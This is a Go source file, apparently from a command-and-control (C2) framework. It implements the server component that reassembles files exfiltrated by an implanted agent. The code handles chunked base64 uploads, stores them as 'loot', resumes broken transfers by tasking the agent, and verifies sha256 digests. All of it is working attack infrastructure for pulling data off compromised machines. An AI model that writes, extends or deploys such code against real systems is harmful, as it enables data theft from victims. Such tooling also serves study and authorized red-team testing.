package c2

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"hash"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ExfilAssembler reassembles chunked file uploads produced by the agent's
// FileExfil (task results streamed over the C2 channel) and supports resume:
// partial data lives in <loot>/.parts/<transfer-id>.part, so the received
// offset survives agent reconnects AND server restarts. When a chunk arrives
// with a gap (agent resent from an older offset, or a previous connection
// died mid-transfer), the assembler enqueues an __exfil_resume task telling
// the agent the exact byte offset to continue from.
//
// Agent protocol (TaskResult.Output):
//
//	file_begin:<transfer-id>:<total-size>:<basename>
//	file_chunk:<transfer-id>:<offset>:<base64-data>
//	file_end:<transfer-id>:<sha256-hex|->        (hex of the whole file)
//	file_abort:<transfer-id>
//
// transfer-id is computed by the agent as sha256(hostname|path|size|mtime)[:16]
// and is therefore stable across reconnects for the same file.
type ExfilAssembler struct {
	partsDir string
	files    *FileManager

	// onResume is invoked when the server needs the agent to continue a
	// transfer from a given offset (wired to CreateTask("__exfil_resume ...")).
	onResume func(sessionID, transferID string, offset int64)

	mu        sync.Mutex
	transfers map[string]*partialTransfer
	lastAsk   map[string]time.Time
}

type partialTransfer struct {
	sessionID string
	filename  string
	module    string
	totalSize int64
	received  int64
	partPath  string
	metaPath  string
	file      *os.File
	hash      hash.Hash
}

type partMeta struct {
	SessionID string `json:"session_id"`
	Filename  string `json:"filename"`
	Module    string `json:"module"`
	TotalSize int64  `json:"total_size"`
}

const (
	maxExfilFileSize  = 4 << 30        // 4 GiB safety cap
	maxExfilChunk     = 8 << 20        // 8 MiB per file_chunk (decoded)
	maxExfilTransfers = 64             // concurrent in-flight transfers per server
	partStaleAfter    = 24 * time.Hour // abandoned .part files are swept on the next begin
)

// NewExfilAssembler creates the assembler; lootDir must match the
// FileManager base directory so finalized files join the normal listing.
func NewExfilAssembler(lootDir string, files *FileManager, onResume func(sessionID, transferID string, offset int64)) *ExfilAssembler {
	partsDir := filepath.Join(lootDir, ".parts")
	os.MkdirAll(partsDir, 0700)
	return &ExfilAssembler{
		partsDir:  partsDir,
		files:     files,
		onResume:  onResume,
		transfers: make(map[string]*partialTransfer),
		lastAsk:   make(map[string]time.Time),
	}
}

// HandleOutput inspects an agent task result and consumes file transfer
// messages. Non-file outputs return immediately.
func (e *ExfilAssembler) HandleOutput(sessionID, output string) {
	if !strings.HasPrefix(output, "file_") {
		return
	}

	switch {
	case strings.HasPrefix(output, "file_begin:"):
		e.handleBegin(sessionID, strings.TrimPrefix(output, "file_begin:"))
	case strings.HasPrefix(output, "file_chunk:"):
		e.handleChunk(sessionID, strings.TrimPrefix(output, "file_chunk:"))
	case strings.HasPrefix(output, "file_end:"):
		e.handleEnd(sessionID, strings.TrimPrefix(output, "file_end:"))
	case strings.HasPrefix(output, "file_abort:"):
		e.handleAbort(strings.TrimPrefix(output, "file_abort:"))
	}
}

func validTransferID(id string) bool {
	if len(id) == 0 || len(id) > 64 {
		return false
	}
	for _, r := range id {
		switch {
		case r >= '0' && r <= '9', r >= 'a' && r <= 'f', r >= 'A' && r <= 'F', r == '-', r == '_':
		default:
			return false
		}
	}
	return true
}

func sanitizeBaseName(name string) (string, error) {
	sane := filepath.Base(strings.TrimSpace(name))
	if sane == "" || sane == "." || sane == ".." || sane == "/" || sane == `\` {
		return "", fmt.Errorf("invalid filename %q", name)
	}
	if strings.ContainsAny(sane, "/\\") || strings.ContainsAny(sane, "\x00\n\r\t") {
		return "", fmt.Errorf("invalid filename %q", name)
	}
	return sane, nil
}

func (e *ExfilAssembler) handleBegin(sessionID, rest string) {
	fields := strings.SplitN(rest, ":", 3)
	if len(fields) != 3 {
		return
	}
	id := fields[0]
	if !validTransferID(id) {
		return
	}
	var total int64
	total, err := strconv.ParseInt(fields[1], 10, 64)
	if err != nil || total < 0 || total > maxExfilFileSize {
		return
	}
	filename, err := sanitizeBaseName(fields[2])
	if err != nil {
		return
	}

	e.mu.Lock()
	defer e.mu.Unlock()

	if t, ok := e.transfers[id]; ok {
		// Already assembling (or resumed). Keep existing state.
		_ = t
		return
	}
	if len(e.transfers) >= maxExfilTransfers {
		// Resource cap: a buggy or malicious agent cannot open an unbounded
		// number of partial files (each holds an fd and up to maxExfilFileSize).
		return
	}

	e.sweepStalePartsLocked()

	partPath := filepath.Join(e.partsDir, id+".part")
	metaPath := filepath.Join(e.partsDir, id+".meta")

	var received int64
	var h hash.Hash
	if info, err := os.Stat(partPath); err == nil {
		// Server restarted (or begin re-sent after reconnect): the .part
		// file holds all contiguously received bytes. Recompute the hash
		// so the final integrity check still works.
		received = info.Size()
		if received > total {
			// Stale/incompatible partial from a different source file — restart it.
			os.Remove(partPath)
			os.Remove(metaPath)
			received = 0
		} else if received > 0 {
			h = sha256.New()
			if pf, err := os.Open(partPath); err == nil {
				io.Copy(h, pf)
				pf.Close()
			}
		}
	}
	if received == 0 {
		h = sha256.New()
		os.Remove(partPath)
		os.Remove(metaPath)
	}

	f, err := os.OpenFile(partPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		return
	}

	e.transfers[id] = &partialTransfer{
		sessionID: sessionID,
		filename:  filename,
		module:    "exfil",
		totalSize: total,
		received:  received,
		partPath:  partPath,
		metaPath:  metaPath,
		file:      f,
		hash:      h,
	}

	// Persist metadata so a server restart can finalize correctly.
	if _, err := os.Stat(metaPath); os.IsNotExist(err) {
		if meta, err := json.Marshal(partMeta{
			SessionID: sessionID,
			Filename:  filename,
			TotalSize: total,
		}); err == nil {
			os.WriteFile(metaPath, meta, 0600)
		}
	}

	if received > 0 && received < total {
		e.askResumeLocked(sessionID, id, received)
	}
}

func (e *ExfilAssembler) handleChunk(sessionID, rest string) {
	fields := strings.SplitN(rest, ":", 3)
	if len(fields) != 3 {
		return
	}
	id := fields[0]
	if !validTransferID(id) {
		return
	}
	var offset int64
	offset, err := strconv.ParseInt(fields[1], 10, 64)
	if err != nil || offset < 0 {
		return
	}
	// Bound the base64 field BEFORE decoding so a giant garbage chunk can
	// never allocate memory (the transfer lookup below happens first anyway,
	// but an authenticated agent could still spam chunks for unknown ids).
	if len(fields[2]) > base64.StdEncoding.EncodedLen(maxExfilChunk) {
		return
	}

	e.mu.Lock()
	defer e.mu.Unlock()

	t, ok := e.transfers[id]
	if !ok {
		return // chunk without begin — ignore
	}

	data, err := decodeBase64Flexible(fields[2])
	if err != nil || len(data) == 0 {
		return
	}

	if offset < t.received {
		return // duplicate/retry — already have these bytes
	}
	if offset > t.received {
		// Gap: ask the agent to continue from the server's offset.
		e.askResumeLocked(sessionID, id, t.received)
		return
	}
	if t.received+int64(len(data)) > t.totalSize {
		return // would overflow the declared size — drop
	}

	n, err := t.file.Write(data)
	if err != nil {
		return
	}
	t.received += int64(n)
	if t.hash != nil {
		t.hash.Write(data[:n])
	}
}

func (e *ExfilAssembler) handleEnd(sessionID, rest string) {
	fields := strings.SplitN(rest, ":", 2)
	if len(fields) != 2 {
		return
	}
	id := fields[0]
	if !validTransferID(id) {
		return
	}
	wantHash := fields[1]

	e.mu.Lock()
	t, ok := e.transfers[id]
	if !ok {
		e.mu.Unlock()
		return
	}
	if t.received != t.totalSize {
		// Incomplete: keep the partial and ask the agent to finish it.
		e.askResumeLocked(sessionID, id, t.received)
		e.mu.Unlock()
		return
	}
	// Verify integrity when the agent provided a digest.
	if wantHash != "" && wantHash != "-" && t.hash != nil {
		got := hex.EncodeToString(t.hash.Sum(nil))
		if got != strings.ToLower(wantHash) {
			// Corrupted transfer: drop everything; the agent will restart.
			t.file.Close()
			os.Remove(t.partPath)
			os.Remove(t.metaPath)
			delete(e.transfers, id)
			delete(e.lastAsk, id)
			e.mu.Unlock()
			return
		}
	}
	partPath, metaPath := t.partPath, t.metaPath
	session, filename, module, size := t.sessionID, t.filename, t.module, t.received
	t.file.Close()
	delete(e.transfers, id)
	delete(e.lastAsk, id)
	e.mu.Unlock()

	if e.files != nil {
		e.files.Finalize(session, filename, module, partPath, size)
	}
	os.Remove(metaPath)
}

func (e *ExfilAssembler) handleAbort(rest string) {
	id := rest
	if !validTransferID(id) {
		return
	}
	e.mu.Lock()
	defer e.mu.Unlock()
	if t, ok := e.transfers[id]; ok {
		t.file.Close()
		delete(e.transfers, id)
	}
	delete(e.lastAsk, id)
	os.Remove(filepath.Join(e.partsDir, id+".part"))
	os.Remove(filepath.Join(e.partsDir, id+".meta"))
}

// sweepStalePartsLocked removes .part/.meta leftovers from transfers that were
// abandoned long ago (agent died mid-transfer and never resumed). It runs
// lazily on each new begin, so no background goroutine or shutdown hook is
// needed. Caller must hold e.mu.
func (e *ExfilAssembler) sweepStalePartsLocked() {
	entries, err := os.ReadDir(e.partsDir)
	if err != nil || len(entries) == 0 {
		return
	}
	cutoff := time.Now().Add(-partStaleAfter)
	for _, entry := range entries {
		name := entry.Name()
		if !strings.HasSuffix(name, ".part") || entry.IsDir() {
			continue
		}
		id := strings.TrimSuffix(name, ".part")
		if _, active := e.transfers[id]; active {
			continue
		}
		info, err := entry.Info()
		if err != nil || info.ModTime().After(cutoff) {
			continue
		}
		os.Remove(filepath.Join(e.partsDir, name))
		os.Remove(filepath.Join(e.partsDir, id+".meta"))
	}
}

// askResumeLocked notifies the agent to continue from the given offset.
// Caller must hold e.mu. Rate-limited to one request per transfer per 2s.
func (e *ExfilAssembler) askResumeLocked(sessionID, id string, offset int64) {
	if e.onResume == nil {
		return
	}
	if last, ok := e.lastAsk[id]; ok && time.Since(last) < 2*time.Second {
		return
	}
	e.lastAsk[id] = time.Now()
	e.onResume(sessionID, id, offset)
}

// PendingTransfers returns the state of in-flight transfers (debug/API).
func (e *ExfilAssembler) PendingTransfers() []map[string]interface{} {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]map[string]interface{}, 0, len(e.transfers))
	for id, t := range e.transfers {
		out = append(out, map[string]interface{}{
			"id":       id,
			"filename": t.filename,
			"received": t.received,
			"total":    t.totalSize,
		})
	}
	return out
}

// decodeBase64Flexible accepts standard and raw (unpadded) base64.
func decodeBase64Flexible(s string) ([]byte, error) {
	if b, err := base64.StdEncoding.DecodeString(s); err == nil {
		return b, nil
	}
	return base64.RawStdEncoding.DecodeString(s)
}
